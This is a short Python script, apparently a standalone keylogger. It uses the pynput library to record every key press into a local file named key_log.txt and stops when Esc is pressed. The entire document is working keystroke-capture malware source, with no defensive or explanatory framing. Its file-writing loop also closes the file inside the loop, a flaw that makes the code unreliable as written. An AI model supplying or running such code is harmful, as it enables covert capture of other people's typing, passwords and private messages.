# Modules
from pynput.keyboard import Key, Listener
from colorama import Fore

# Global variables

keys_information = "key_log.txt"

count = 0 

keys = []

# Functions

def on_press(key):
    global count , keys
    
    keys.append(key)
    count += 1

    if(count >= 1):
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(keys_information , 'a') as f:
        for key in keys:
            k = str(key).replace("'",'')
            if(k.find("space") > 0):
                f.write('\n')
                f.close()
            
            elif(k.find("Key") == -1):
                f.write(k)
                f.close()
    
def on_release(key):
    if(key == Key.esc or key == '\x03'):
      print(Fore.RED + f'Data is saved in {keys_information}\n[-] Closing!\n')
      return False

def listener():
  
  with Listener(on_press=on_press , on_release = on_release) as listener:
    listener.join()

if __name__ == '__main__':
  listener()